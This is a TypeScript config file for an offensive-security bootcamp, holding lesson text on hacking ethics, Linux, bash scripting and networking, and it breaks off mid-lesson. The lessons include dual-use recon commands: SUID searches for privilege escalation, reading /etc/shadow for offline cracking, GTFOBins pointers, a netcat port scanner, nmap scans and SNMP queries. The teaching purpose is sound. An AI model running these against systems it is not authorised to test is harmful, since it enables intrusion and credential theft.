/**
 * HACKER PROTOCOL BOOTCAMP — STATIC CONFIG
 * =========================================
 * Single source of truth for the bootcamp walkthrough structure.
 * MUST mirror the backend bootcamp.config.js exactly.
 *
 * Instruction format supports:
 *   - Fenced code blocks:  ```bash\ncommand\n```
 *   - Inline code:         `command`
 *   - Plain prose
 */

export interface BootcampStep {
  title: string;
  instruction: string;
  /** Exact filename from the filesystem. null = no image yet → show placeholder. */
  image: string | null;
}

export interface BootcampRoom {
  id: string;       // e.g. "room1"
  title: string;    // MUST match backend room title exactly (case-insensitive)
  overview: string;
  estimatedMinutes: number; // Estimated time to complete this room
  steps: BootcampStep[];
}

export interface BootcampPhase {
  id: string;       // e.g. "phase1"
  title: string;    // MUST match backend module title exactly (case-insensitive)
  codename: string;
  rooms: BootcampRoom[];
}

export interface BootcampConfig {
  id: string;
  title: string;
  phases: BootcampPhase[];
}

// ── Image path builder ────────────────────────────────────────────────────────
export function buildStepImagePath(
  phaseId: string,
  roomId: string,
  filename: string
): string {
  // Full URLs (CDN images) are passed through unchanged
  if (filename.startsWith('http://') || filename.startsWith('https://')) {
    return filename;
  }

  const phaseMatch = phaseId.match(/\d+/);
  const roomMatch = roomId.match(/\d+/);
  const phaseNum = phaseMatch ? Number(phaseMatch[0]) : 0;
  const roomNum = roomMatch ? Number(roomMatch[0]) : 0;
  const phaseDir = `phase-${String(phaseNum).padStart(2, '0')}`;
  const roomDir = `room-${String(roomNum).padStart(2, '0')}`;

  const normalized = filename.trim().toLowerCase().replaceAll('_', '-');
  const withStepPrefix = /^step-\d{2}-/.test(normalized)
    ? normalized
    : normalized.replace(/^(\d+)-/, (_m, n) => `step-${String(Number(n)).padStart(2, '0')}-`);

  const encoded = withStepPrefix
    .split('/')
    .map((part) => encodeURIComponent(part))
    .join('/');

  return `/walkthrough/hpb/${phaseDir}/${roomDir}/${encoded}`;
}

// ── Config ────────────────────────────────────────────────────────────────────
export const BOOTCAMP_CONFIG: BootcampConfig = {
  id: 'hpb',
  title: 'Hacker Protocol Bootcamp',
  phases: [

    // ── PHASE 1: HACKER MINDSET (moduleId: 1, 3 rooms) ──────────────────────
    {
      id: 'phase1',
      title: 'Hacker Mindset',
      codename: 'PHASE 1',
      rooms: [
        {
          id: 'room1',
          title: 'Introduction to Offensive Security',
          overview:
            'Offensive security is the practice of thinking and acting like an attacker — with permission — to find weaknesses before real adversaries do. This room explains what the field is, why it exists, and how HSOCIETY fits into it.',
          estimatedMinutes: 20,
          steps: [
            {
              title: 'What Is Offensive Security?',
              instruction:
                `Offensive security (also called red teaming or ethical hacking) is the discipline of proactively attacking systems, networks, and applications to discover vulnerabilities before malicious actors do. The key word is **proactively** — you are not waiting for an attack to happen; you are simulating one under controlled conditions.

The field sits on the opposite side of defensive security (blue teaming), which focuses on detection, response, and hardening. Both sides need each other: defenders need to know what attackers do, and attackers need to understand what defenders look for.

**Core disciplines in offensive security:**
- **Penetration testing** — a scoped, time-boxed engagement to find and report vulnerabilities in a specific target
- **Red teaming** — a longer, more realistic simulation of a full adversary campaign, including social engineering and physical access
- **Bug bounty hunting** — independently finding vulnerabilities in public programmes and reporting them for a reward
- **Vulnerability research** — discovering new, previously unknown vulnerabilities in software or hardware

In your notes, write down the key difference between offensive and defensive security in your own words. Then write one sentence explaining why organisations pay people to attack their own systems.`,
              image: '01-intro.png',
            },
            {
              title: 'The HSOCIETY Operating Model',
              instruction:
                `HSOCIETY is built on three pillars: **education**, **execution**, and **community**. Understanding this model tells you exactly what you are training for and how the programme is structured.

**Education** — You are here. The bootcamp gives you the technical foundation, the methodology, and the mindset. No prior experience is assumed. Everything is built from first principles.

**Execution** — After the bootcamp, you apply what you have learned in real engagements: CTF competitions, bug bounty programmes, and eventually client work. Execution is where theory becomes skill.

**Community** — Offensive security is a team sport. The HSOCIETY community is where you share findings, ask questions, collaborate on challenges, and build your reputation as an operator.

Write down what each pillar means to you personally. Be specific — not "I want to learn hacking" but "I want to be able to conduct a web application penetration test independently within six months."`,
              image: '02-model.png',
            },
            {
              title: 'Career Paths in Offensive Security',
              instruction:
                `The offensive security field has several distinct career paths. Knowing which one interests you helps you focus your learning.

**Penetration Tester** — Works for a consultancy or in-house security team. Conducts scoped assessments of networks, web applications, and infrastructure. Produces written reports with findings and remediation advice. This is the most common entry point.

**Red Team Operator** — Simulates advanced persistent threats (APTs). Works in longer engagements, often without the blue team knowing. Requires deep technical skill and creativity.

**Bug Bounty Hunter** — Works independently, finding vulnerabilities in public programmes run by companies like Google, Microsoft, and HackerOne. Income is variable but uncapped.

**Security Researcher** — Discovers new vulnerability classes, writes exploits, and publishes research. Often works at security firms, universities, or independently.

**CTF Player** — Competes in Capture The Flag competitions. A great way to build skills and reputation. Many professionals started here.

In your notes, rank these paths from most to least interesting to you and explain why. This is not a permanent decision — it is a starting point for your learning focus.`,
              image: '03-roles.png',
            },
          ],
        },
        {
          id: 'room2',
          title: 'The Hacker Mindset',
          overview:
            'The most important tool you will ever develop is not a piece of software — it is how you think. This room breaks down the cognitive traits that separate effective operators from people who just run tools.',
          estimatedMinutes: 18,
          steps: [
            {
              title: 'The Three Core Traits',
              instruction:
                `Every effective operator shares three cognitive traits. These are not personality types you are born with — they are habits you develop through deliberate practice.

**1. Curiosity** — The drive to understand how things work, not just that they work. When you see a login form, a curious operator asks: what happens if I send an unexpected character? What database is behind this? What framework is the application built on? Curiosity is what makes you look one layer deeper than everyone else.

**2. Persistence** — Most attacks fail on the first attempt. Effective operators iterate. They try a different payload, a different port, a different approach. The difference between finding a vulnerability and missing it is often just one more attempt.

**3. Lateral thinking** — The ability to approach a problem from an unexpected angle. Security controls are designed to stop expected attacks. Lateral thinking is how you find the path the defender did not anticipate.

For each trait, write a concrete example of how it would apply in a real engagement. Do not use generic examples — think of a specific scenario.`,
              image: '01-mindset.png',
            },
            {
              title: 'Applying the Mindset',
              instruction:
                `The hacker mindset is not something you switch on during an engagement — it is a way of observing the world. You can practise it right now, without any tools.

Pick any object near you — a door lock, a coffee machine, a website you use daily. Apply the following questions:

1. **How was this built?** What assumptions did the designer make about how it would be used?
2. **What is the intended use?** What is the system designed to do?
3. **What is the unintended use?** What can it do that the designer did not intend?
4. **What does it trust?** What inputs does it accept without verification?
5. **What happens at the boundary?** What happens when you give it input that is too long, too short, unexpected, or malformed?

This exercise is not trivial. The ability to ask these questions about any system — a web application, a network protocol, a physical lock — is the foundation of every vulnerability discovery.

Write your answers for the object you chose. Be specific and detailed.`,
              image: '02-apply.png',
            },
            {
              title: 'Tools vs. Understanding',
              instruction:
                `There is a critical distinction between someone who runs tools and someone who understands what those tools do. This distinction determines your ceiling as an operator.

A tool runner opens Metasploit, selects an exploit, and runs it. If it works, they report it. If it does not, they move on. They cannot adapt when the tool fails, cannot explain the vulnerability to a client, and cannot find vulnerabilities that no tool covers.

An operator understands the underlying vulnerability — the memory corruption, the logic flaw, the misconfiguration. They can replicate the attack manually, adapt it to a different context, and explain it clearly in a report.

**The goal of this bootcamp is to make you an operator, not a tool runner.**

Every tool you use in this programme, you will understand from first principles before you use it. You will know what it does, why it works, and how to replicate its core function manually.

In your notes, answer this question honestly: right now, are you closer to a tool runner or an operator? What specific knowledge gaps would you need to close to move further toward operator?`,
              image: '03-discuss.png',
            },
          ],
        },
        {
          id: 'room3',
          title: 'Ethics & Legal Boundaries',
          overview:
            'Operating without authorisation is a criminal offence in every jurisdiction. This room covers the legal framework, the concept of scope, and responsible disclosure — the non-negotiable foundations of professional offensive security.',
          estimatedMinutes: 22,
          steps: [
            {
              title: 'The Legal Framework',
              instruction:
                `Offensive security without written authorisation is illegal. This is not a grey area. The following laws apply depending on your jurisdiction:

**United Kingdom** — The Computer Misuse Act 1990 (CMA) makes it a criminal offence to access a computer system without authorisation (Section 1), to access with intent to commit further offences (Section 2), and to impair the operation of a computer (Section 3). Penalties range from fines to 10 years imprisonment.

**United States** — The Computer Fraud and Abuse Act (CFAA) prohibits unauthorised access to protected computers. Penalties can reach 20 years imprisonment for serious offences.

**European Union** — Directive 2013/40/EU on attacks against information systems criminalises unauthorised access across all member states.

**The key principle in every jurisdiction:** authorisation is the line between legal security testing and criminal hacking. The technical actions are identical — only the authorisation differs.

In your notes, research the specific law that applies in your country. Write down the key offences and their maximum penalties. You are responsible for knowing this.`,
              image: '/assets/bootcamp/rooms/ethics-legal-framework.jpg',
            },
            {
              title: 'Scope and Authorisation',
              instruction:
                `In a professional engagement, **scope** defines exactly what you are and are not permitted to test. It is documented in a written agreement before any testing begins.

A typical scope document includes:
- **In-scope targets** — specific IP ranges, domains, or applications you are permitted to test
- **Out-of-scope targets** — systems you must not touch, even if you discover them during testing
- **Permitted techniques** — what attack types are allowed (e.g. no denial of service, no physical access)
- **Testing window** — the dates and times during which testing is permitted
- **Emergency contacts** — who to call if you accidentally cause an outage or find a critical vulnerability

**Why this matters:** If you test a system that is out of scope — even accidentally — you may have committed a criminal offence. The authorisation document is your legal protection. Without it, you have none.

Write down in your notes: what would you do if, during a penetration test, you discovered a critical vulnerability in a system that was out of scope? There is a correct answer — research it.`,
              image: '/assets/bootcamp/rooms/ethics-scope-authorization.jpg',
            },
            {
              title: 'Responsible Disclosure',
              instruction:
                `Responsible disclosure (also called coordinated disclosure) is the process of reporting a vulnerability to the affected organisation before making it public, giving them time to fix it.

**The standard disclosure process:**

1. **Discover** the vulnerability and document it thoroughly — what it is, how to reproduce it, and what the impact is
2. **Identify** the correct contact — most organisations have a security@[domain] address or a published security policy
3. **Report** the vulnerability privately, including all technical details and a proof of concept
4. **Agree on a timeline** — the industry standard is 90 days for the organisation to release a fix before you publish
5. **Follow up** if there is no response within a reasonable time (typically 7-14 days)
6. **Publish** your findings after the fix is released, or after the agreed deadline passes

**Why this matters:** Publishing a vulnerability before a fix is available puts every user of that software at risk. Responsible disclosure balances the public's right to know with the need to protect users.

**Bug bounty programmes** formalise this process — companies publish the rules, the scope, and the rewards. Always read the programme rules before testing.

Document the full responsible disclosure process in your notes. Include what you would do if the organisation ignored your report after 90 days.`,
              image: '/assets/bootcamp/rooms/ethics-responsible-disclosure.jpg',
            },
          ],
        },
      ],
    },

    // ── PHASE 2: LINUX FOUNDATIONS (moduleId: 2, 4 rooms) ───────────────────
    {
      id: 'phase2',
      title: 'Linux Foundations',
      codename: 'PHASE 2',
      rooms: [
        {
          id: 'room1',
          title: 'Linux Basics & Navigation',
          overview:
            'Linux is the operating system of offensive security. Nearly every tool you will use runs on Linux, and most targets run Linux servers. This room builds the terminal fluency you need to operate effectively.',
          estimatedMinutes: 25,
          steps: [
            {
              title: 'The Terminal and the Filesystem',
              instruction:
                `The terminal is your primary interface. Unlike a graphical file manager, the terminal gives you direct, scriptable access to every part of the system. You need to be completely comfortable here.

The Linux filesystem starts at \`/\` (root). Everything — files, devices, processes — is represented as a file somewhere under this root. Key directories:

- \`/home\` — user home directories (your files live here)
- \`/etc\` — system configuration files (critical for attackers and defenders)
- \`/var\` — variable data: logs, databases, mail
- \`/tmp\` — temporary files (world-writable — important for privilege escalation)
- \`/bin\`, \`/usr/bin\` — executable programs
- \`/root\` — the root user's home directory

Run these commands and observe the output carefully:

\`\`\`bash
# Show your current working directory
pwd

# List all files including hidden ones, with details
ls -la

# Show the full filesystem tree from root (2 levels deep)
ls -la /

# Show your home directory
ls -la ~
\`\`\`

In your notes, draw the directory structure you see. Mark which directories you think would be most interesting to an attacker and explain why.`,
              image: '01-terminal.png',
            },
            {
              title: 'Navigating the Filesystem',
              instruction:
                `Efficient navigation is a core skill. You should be able to move anywhere in the filesystem without thinking about it.

\`\`\`bash
# Move into a directory
cd /etc

# Go up one level
cd ..

# Go to your home directory (two equivalent ways)
cd ~
cd

# Go to the previous directory
cd -

# Show where you are
pwd

# List contents with human-readable file sizes
ls -lah

# Find files by name (useful for recon)
find / -name "passwd" 2>/dev/null

# Find files modified in the last 24 hours
find /etc -mtime -1 2>/dev/null
\`\`\`

The \`2>/dev/null\` at the end of find commands redirects error messages (permission denied, etc.) to /dev/null so they do not clutter your output. You will use this constantly.

Practice: navigate to \`/etc\`, then to \`/var/log\`, then back to your home directory without using \`cd ~\`. Use \`pwd\` at each step to confirm where you are.`,
              image: '02-navigate.png',
            },
            {
              title: 'Understanding File Permissions',
              instruction:
                `Every file and directory in Linux has a permission string. Reading permissions is essential — both for understanding what you can access and for identifying misconfigurations.

When you run \`ls -la\`, you see output like:
\`\`\`bash
-rwxr-xr-x  1 root root  4096 Jan 01 12:00 /bin/bash
drwxr-xr-x  2 alice alice 4096 Jan 01 12:00 /home/alice
-rw-------  1 alice alice  220 Jan 01 12:00 /home/alice/.bash_history
\`\`\`

The permission string has 10 characters:
- **Position 1**: file type (\`-\` = file, \`d\` = directory, \`l\` = symlink)
- **Positions 2-4**: owner permissions (read \`r\`, write \`w\`, execute \`x\`)
- **Positions 5-7**: group permissions
- **Positions 8-10**: world (everyone else) permissions

**Why this matters for attackers:** World-writable files (\`-rw-rw-rw-\`) can be modified by any user. SUID files (\`-rwsr-xr-x\`) run with the owner's privileges — if owned by root, they are a privilege escalation target.

\`\`\`bash
# Find all SUID files (potential privilege escalation vectors)
find / -perm -4000 -type f 2>/dev/null

# Find world-writable files
find / -perm -o+w -type f 2>/dev/null

# Find world-writable directories
find / -perm -o+w -type d 2>/dev/null
\`\`\`

Run the SUID search on your system and document every result. Look up any binaries you do not recognise.`,
              image: '03-permissions.png',
            },
            {
              title: 'Reading Files and Searching Content',
              instruction:
                `Reading and searching file content is something you will do constantly during enumeration. Master these tools.

\`\`\`bash
# Print entire file to terminal
cat /etc/passwd

# Read file page by page (press q to quit, space for next page)
less /etc/passwd

# Show first 10 lines
head /etc/passwd

# Show last 10 lines (useful for logs)
tail /var/log/auth.log

# Follow a log file in real time
tail -f /var/log/auth.log

# Search for a pattern in a file
grep "root" /etc/passwd

# Search recursively in a directory
grep -r "password" /etc/ 2>/dev/null

# Search case-insensitively
grep -i "password" /etc/passwd

# Show line numbers with matches
grep -n "root" /etc/passwd

# Search for a pattern and show 2 lines of context
grep -A 2 -B 2 "root" /etc/passwd
\`\`\`

Practice: use \`grep\` to find all users in \`/etc/passwd\` who have \`/bin/bash\` as their shell. These are the accounts that can log in interactively — important for enumeration.`,
              image: '04-reading.png',
            },
          ],
        },
        {
          id: 'room2',
          title: 'Users, Groups & Permissions',
          overview:
            'Access control is the foundation of system security. Understanding how Linux manages users, groups, and privileges is essential for both attacking and defending systems — and for understanding privilege escalation.',
          estimatedMinutes: 25,
          steps: [
            {
              title: 'Users and Identity',
              instruction:
                `Every process on Linux runs as a user. Every file is owned by a user. Understanding the user model is fundamental to understanding what you can and cannot do on a system.

\`\`\`bash
# Show your current user and group memberships
id

# Show just your username
whoami

# Show all logged-in users
who

# Show last login history
last

# Show failed login attempts (requires root or sudo)
lastb
\`\`\`

The \`id\` command output looks like:
\`\`\`bash
uid=1000(alice) gid=1000(alice) groups=1000(alice),4(adm),27(sudo),1001(docker)
\`\`\`

**What this tells an attacker:**
- \`uid=0\` means root — full control of the system
- Group membership in \`sudo\` means the user can run commands as root
- Group membership in \`docker\` is a known privilege escalation vector
- Group membership in \`adm\` gives access to system logs

Run \`id\` on your system. Look up every group you are a member of and understand what access each one grants.`,
              image: '01-id.png',
            },
            {
              title: 'The passwd and shadow Files',
              instruction:
                `Two files are critical for understanding user accounts on a Linux system: \`/etc/passwd\` and \`/etc/shadow\`.

\`\`\`bash
# View the passwd file (readable by all users)
cat /etc/passwd

# View the shadow file (requires root)
sudo cat /etc/shadow
\`\`\`

**\`/etc/passwd\` format** (colon-separated):
\`\`\`bash
username:x:UID:GID:comment:home_directory:shell
root:x:0:0:root:/root:/bin/bash
alice:x:1000:1000:Alice Smith:/home/alice:/bin/bash
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
\`\`\`

The \`x\` in the password field means the actual hash is in \`/etc/shadow\`. The shell field tells you whether the account can log in interactively — \`/usr/sbin/nologin\` or \`/bin/false\` means it cannot.

**\`/etc/shadow\` format:**
\`\`\`bash
username:$hash_type$salt$hash:last_changed:min:max:warn:inactive:expire
\`\`\`

The hash type prefix tells you the algorithm: \`$1$\` = MD5 (weak), \`$5$\` = SHA-256, \`$6$\` = SHA-512 (current standard), \`$y$\` = yescrypt (modern).

**Why this matters:** If you can read \`/etc/shadow\`, you can attempt to crack the hashes offline using tools like \`hashcat\` or \`john\`. This is a common post-exploitation step.`,
              image: '02-passwd.png',
            },
            {
              title: 'Changing Permissions and Ownership',
              instruction:
                `Understanding how to change permissions is important both for setting up your own environment and for understanding what an attacker can do after gaining access.

\`\`\`bash
# Create a test file
touch testfile.txt

# View current permissions
ls -la testfile.txt

# Give owner read+write+execute, group read+execute, world nothing
chmod 750 testfile.txt

# Give everyone read+write
chmod 666 testfile.txt

# Remove world execute permission
chmod o-x testfile.txt

# Add execute for owner
chmod u+x testfile.txt

# Change file owner (requires root)
sudo chown root:root testfile.txt

# Change just the group
sudo chgrp www-data testfile.txt

# Recursively change permissions on a directory
chmod -R 755 /var/www/html
\`\`\`

**Numeric permission reference:**
- \`7\` = rwx (read + write + execute)
- \`6\` = rw- (read + write)
- \`5\` = r-x (read + execute)
- \`4\` = r-- (read only)
- \`0\` = --- (no permissions)

Practice: create a script file, make it executable with \`chmod +x\`, and run it. Then remove the execute permission and try to run it again. Observe the error.`,
              image: '03-chmod.png',
            },
            {
              title: 'sudo and Privilege Escalation Basics',
              instruction:
                `\`sudo\` (superuser do) allows permitted users to run commands as root or another user. It is one of the most important concepts in Linux privilege escalation.

\`\`\`bash
# Run a command as root
sudo command

# List what commands you can run with sudo
sudo -l

# Switch to root shell (if permitted)
sudo -i
sudo su -

# Run a command as a specific user
sudo -u www-data command

# Edit the sudoers file safely
sudo visudo
\`\`\`

**The \`sudo -l\` output is critical for privilege escalation.** It shows exactly what commands you can run with elevated privileges. Example output:

\`\`\`bash
User alice may run the following commands on target:
    (ALL : ALL) ALL
    (root) NOPASSWD: /usr/bin/find
    (root) NOPASSWD: /usr/bin/vim
\`\`\`

**What this means:**
- \`(ALL : ALL) ALL\` — can run any command as any user (full sudo)
- \`NOPASSWD: /usr/bin/find\` — can run \`find\` as root without a password
- \`NOPASSWD: /usr/bin/vim\` — can run \`vim\` as root without a password

Both \`find\` and \`vim\` can be used to escalate to a root shell. This is documented on GTFOBins (gtfobins.github.io) — a reference for Unix binaries that can be abused for privilege escalation.

Run \`sudo -l\` on your system. Look up every binary listed on GTFOBins and document whether it can be used for privilege escalation.`,
              image: '04-sudo.png',
            },
          ],
        },
        {
          id: 'room3',
          title: 'Processes & Networking',
          overview:
            'Every running service is a potential attack surface. This room teaches you to enumerate what is running on a system, what ports are open, and how to interact with the network from the command line.',
          estimatedMinutes: 25,
          steps: [
            {
              title: 'Process Enumeration',
              instruction:
                `Processes are running programs. During post-exploitation, enumerating processes tells you what services are running, what users are running them, and what credentials might be in memory or in process arguments.

\`\`\`bash
# List all running processes with full details
ps aux

# Show process tree (parent-child relationships)
ps auxf

# Show processes for a specific user
ps -u root

# Interactive process viewer (press q to quit)
top
htop  # more user-friendly, may need to install

# Find a process by name
pgrep -a nginx
pgrep -a python

# Show full command line of a process by PID
cat /proc/1234/cmdline | tr '\0' ' '

# List open files for a process (requires root for other users' processes)
lsof -p 1234
\`\`\`

**What to look for:**
- Processes running as root that you would not expect
- Web servers, databases, or custom applications
- Processes with credentials in their command line arguments (common misconfiguration)
- Processes running from unusual directories like \`/tmp\`

Run \`ps aux\` and identify every process running as root. For each one, ask: what does this process do, and what would happen if it were compromised?`,
              image: '01-ps.png',
            },
            {
              title: 'Network Enumeration',
              instruction:
                `Knowing what ports are open and what services are listening is essential for both local enumeration (after gaining access) and remote scanning (before gaining access).

\`\`\`bash
# List all listening TCP and UDP ports with process names
ss -tulnp

# Alternative (older systems)
netstat -tulnp

# Show all established connections
ss -tnp

# Show only listening TCP ports
ss -tlnp

# Show only listening UDP ports
ss -ulnp

# Check if a specific port is open
ss -tlnp | grep :80
ss -tlnp | grep :443
ss -tlnp | grep :22
\`\`\`

**Output interpretation:**
\`\`\`bash
Netid  State   Recv-Q  Send-Q  Local Address:Port  Peer Address:Port  Process
tcp    LISTEN  0       128     0.0.0.0:22           0.0.0.0:*          users:(("sshd",pid=1234))
tcp    LISTEN  0       511     127.0.0.1:3306       0.0.0.0:*          users:(("mysqld",pid=5678))
\`\`\`

- \`0.0.0.0:22\` — SSH listening on all interfaces (accessible from the network)
- \`127.0.0.1:3306\` — MySQL listening only on localhost (not directly accessible from outside)

**Why the localhost-only services matter:** If you gain access to the system, you can access services that are not exposed to the network. A MySQL database on port 3306 that is not accessible externally becomes accessible once you have a shell.

Run \`ss -tulnp\` on your system. For every listening service, note the port, the process, and whether it is accessible from the network or only locally.`,
              image: '02-netstat.png',
            },
            {
              title: 'Network Connectivity Tools',
              instruction:
                `These tools let you test connectivity, trace routes, and interact with network services directly from the command line.

\`\`\`bash
# Test if a host is reachable (sends ICMP echo requests)
ping -c 4 google.com

# Trace the route packets take to a destination
traceroute google.com

# Alternative traceroute using TCP (better for firewalled networks)
traceroute -T -p 80 google.com

# DNS lookup
nslookup google.com
dig google.com
dig google.com MX  # Mail records
dig google.com ANY # All records

# Test if a TCP port is open (netcat)
nc -zv 192.168.1.1 80
nc -zv 192.168.1.1 22

# Connect to a service and interact with it
nc 192.168.1.1 80
# Then type: GET / HTTP/1.0 and press Enter twice

# Banner grabbing (identify service version)
nc 192.168.1.1 22
nc 192.168.1.1 25
\`\`\`

**Banner grabbing** is the technique of connecting to a service and reading the initial response it sends. Many services announce their name and version in the banner — this is valuable reconnaissance information.

Practice: use \`nc\` to connect to port 22 on your local machine. Read the SSH banner. What version of OpenSSH is running?`,
              image: '03-ping.png',
            },
            {
              title: 'Process Control',
              instruction:
                `Managing processes is a fundamental skill. You need to be able to start, stop, and manage processes both for your own tools and for understanding how to disrupt services on a target.

\`\`\`bash
# Send SIGTERM (graceful shutdown) to a process by PID
kill 1234

# Send SIGKILL (immediate termination) to a process
kill -9 1234

# Kill all processes with a given name
killall nginx

# Kill processes matching a pattern
pkill -f "python script.py"

# Run a process in the background
command &

# Bring a background process to the foreground
fg

# List background jobs
jobs

# Run a process that survives terminal closure
nohup command &

# Run a command and keep it running after logout
screen -S mysession command
tmux new-session -d -s mysession command
\`\`\`

**SIGTERM vs SIGKILL:**
- \`SIGTERM\` (signal 15) asks the process to shut down gracefully. The process can catch this signal and clean up before exiting.
- \`SIGKILL\` (signal 9) immediately terminates the process. It cannot be caught or ignored. Use this when a process is unresponsive.

Practice: start a \`ping\` command in the background with \`ping google.com &\`. Find its PID with \`pgrep ping\`. Send it SIGTERM. Confirm it stopped with \`ps aux | grep ping\`.`,
              image: '04-kill.png',
            },
          ],
        },
        {
          id: 'room4',
          title: 'Scripting Fundamentals',
          overview:
            'Operators who can script move faster, automate repetitive tasks, and build custom tools. This room teaches bash scripting from first principles — not just syntax, but how to think about automation.',
          estimatedMinutes: 30,
          steps: [
            {
              title: 'Your First Script',
              instruction:
                `A bash script is a text file containing a sequence of commands. The first line (\`#!/bin/bash\`) tells the system which interpreter to use. This line is called the **shebang**.

\`\`\`bash
#!/bin/bash
# This is a comment — the # character starts a comment

# Print a message
echo "Hello, Operator"

# Print the current date and time
echo "Current time: $(date)"

# Print the current user
echo "Running as: $(whoami)"

# Print the current directory
echo "Working directory: $(pwd)"
\`\`\`

Save this as \`hello.sh\`, then make it executable and run it:

\`\`\`bash
# Make the script executable
chmod +x hello.sh

# Run the script
./hello.sh

# Alternative: run without making it executable
bash hello.sh
\`\`\`

**The \`$(command)\` syntax** is called command substitution. It runs the command inside and replaces the \`$(...)\` with the output. This is how you capture command output and use it in your scripts.

Write this script, run it, and confirm the output is correct before moving on.`,
              image: 'step-01-ping-script.png',
            },
            {
              title: 'Variables and Arguments',
              instruction:
                `Variables store values that you can reuse throughout your script. Arguments let you pass values to your script when you run it.

\`\`\`bash
#!/bin/bash

# Declare a variable (no spaces around the = sign)
TARGET="192.168.1.1"
PORT=80

# Use a variable with $
echo "Scanning $TARGET on port $PORT"

# Special variables for script arguments
echo "Script name: $0"
echo "First argument: $1"
echo "Second argument: $2"
echo "All arguments: $@"
echo "Number of arguments: $#"

# Read user input
echo -n "Enter target IP: "
read TARGET_IP
echo "You entered: $TARGET_IP"

# Command substitution into a variable
CURRENT_USER=$(whoami)
echo "Running as: $CURRENT_USER"

# Arithmetic
COUNT=5
TOTAL=$((COUNT * 2))
echo "Total: $TOTAL"
\`\`\`

Write a script that takes a hostname as \`$1\` and pings it 3 times:

\`\`\`bash
#!/bin/bash
if [ -z "$1" ]; then
    echo "Usage: $0 <hostname>"
    exit 1
fi
ping -c 3 "$1"
\`\`\`

Run it with: \`./ping_host.sh google.com\``,
              image: 'step-02-run-script.png',
            },
            {
              title: 'Loops and Iteration',
              instruction:
                `Loops let you repeat actions — essential for scanning multiple targets, processing lists of files, or brute-forcing.

\`\`\`bash
#!/bin/bash

# For loop over a list
for HOST in 192.168.1.1 192.168.1.2 192.168.1.3; do
    echo "Pinging $HOST..."
    ping -c 1 -W 1 "$HOST" > /dev/null 2>&1
    if [ $? -eq 0 ]; then
        echo "$HOST is UP"
    else
        echo "$HOST is DOWN"
    fi
done

# For loop over a range of numbers
for PORT in $(seq 1 1024); do
    echo "Checking port $PORT"
done

# While loop
COUNT=0
while [ $COUNT -lt 5 ]; do
    echo "Count: $COUNT"
    COUNT=$((COUNT + 1))
done

# Loop over lines in a file
while IFS= read -r LINE; do
    echo "Processing: $LINE"
done < targets.txt

# Loop over files matching a pattern
for FILE in /etc/*.conf; do
    echo "Config file: $FILE"
done
\`\`\`

Write a script that reads a list of IP addresses from a file called \`targets.txt\` (one per line) and pings each one, printing whether it is up or down.`,
              image: 'step-03-loop-ping.png',
            },
            {
              title: 'Conditionals and Port Checking',
              instruction:
                `Conditional logic lets your scripts make decisions based on the results of commands or the values of variables.

\`\`\`bash
#!/bin/bash

# Basic if/else
if [ condition ]; then
    # commands if true
else
    # commands if false
fi

# Common test conditions
# [ -z "$VAR" ]     — true if VAR is empty
# [ -n "$VAR" ]     — true if VAR is not empty
# [ -f "$FILE" ]    — true if FILE exists and is a regular file
# [ -d "$DIR" ]     — true if DIR exists and is a directory
# [ "$A" = "$B" ]   — true if strings are equal
# [ "$A" != "$B" ]  — true if strings are not equal
# [ $A -eq $B ]     — true if integers are equal
# [ $A -gt $B ]     — true if A is greater than B
# [ $? -eq 0 ]      — true if last command succeeded

# Port checker using netcat
check_port() {
    local HOST="$1"
    local PORT="$2"
    nc -zw1 "$HOST" "$PORT" 2>/dev/null
    if [ $? -eq 0 ]; then
        echo "[OPEN]   $HOST:$PORT"
    else
        echo "[CLOSED] $HOST:$PORT"
    fi
}

# Scan common ports on a target
TARGET="$\{1:-127.0.0.1}"
PORTS=(21 22 23 25 53 80 110 143 443 445 3306 3389 8080 8443)

echo "Scanning $TARGET..."
for PORT in "$\{PORTS[@]}"; do
    check_port "$TARGET" "$PORT"
done
\`\`\`

Save this as \`portscan.sh\`, make it executable, and run it against your local machine: \`./portscan.sh 127.0.0.1\`. Document every open port you find.`,
              image: 'step-04-port-scanner.png',
            },
          ],
        },
      ],
    },

    // ── PHASE 3: NETWORKING (moduleId: 3, 4 rooms) ──────────────────────────
    {
      id: 'phase3',
      title: 'Networking',
      codename: 'PHASE 3',
      rooms: [
        {
          id: 'room1',
          title: 'TCP/IP & OSI Model',
          overview:
            'Every attack and defence starts with understanding how data moves across networks. This room builds the theoretical foundation — the OSI model, TCP/IP, and the protocols that underpin everything you will attack.',
          estimatedMinutes: 25,
          steps: [
            {
              title: 'The OSI Model',
              instruction:
                `The OSI (Open Systems Interconnection) model describes network communication in seven layers. Every network attack operates at one or more of these layers.

Layer 7 — Application: HTTP, HTTPS, DNS, SMTP, FTP, SSH. Attacks: SQLi, XSS, phishing.
Layer 6 — Presentation: SSL/TLS, encoding. Attacks: SSL stripping.
Layer 5 — Session: NetBIOS, RPC. Attacks: session hijacking.
Layer 4 — Transport: TCP, UDP. Attacks: SYN flood, port scanning.
Layer 3 — Network: IP, ICMP, ARP. Attacks: IP spoofing, ARP poisoning.
Layer 2 — Data Link: Ethernet, Wi-Fi. Attacks: MAC spoofing.
Layer 1 — Physical: cables, radio waves. Attacks: physical tapping.

Memory aid: "Please Do Not Throw Sausage Pizza Away" (Physical, Data Link, Network, Transport, Session, Presentation, Application).

Draw the model from memory. For each layer, write one attack that targets it.`,
              image: '01-ls.png',
            },
            {
              title: 'The TCP Three-Way Handshake',
              instruction:
                `TCP is connection-oriented. Before data is exchanged, a three-way handshake establishes the connection. Understanding this is essential for port scanning and many attacks.

The handshake sequence:
\`\`\`bash
# SYN scan — sends SYN, waits for SYN-ACK, then sends RST (half-open, stealthy)
sudo nmap -sS 192.168.1.1

# Full connect scan — completes the handshake (no root required, more detectable)
nmap -sT 192.168.1.1
\`\`\`

A SYN flood attack sends thousands of SYN packets without completing the handshake, exhausting the server's connection table — a denial-of-service attack.

Capture a TCP handshake with Wireshark: start a capture, run \`curl http://example.com\`, filter for \`tcp\`, and find the three SYN/SYN-ACK/ACK packets. Identify each one.`,
              image: '02-cd.png',
            },
            {
              title: 'TCP vs UDP',
              instruction:
                `TCP is reliable and connection-oriented. UDP is fast and connectionless. Knowing which services use which protocol tells you how to scan and attack them.

Common UDP services worth targeting:
\`\`\`bash
# UDP scan with nmap
sudo nmap -sU 192.168.1.1

# Scan specific UDP ports
sudo nmap -sU -p 53,67,68,69,123,161,162 192.168.1.1

# Query SNMP with default community string (port 161)
snmpwalk -v2c -c public 192.168.1.1
\`\`\`

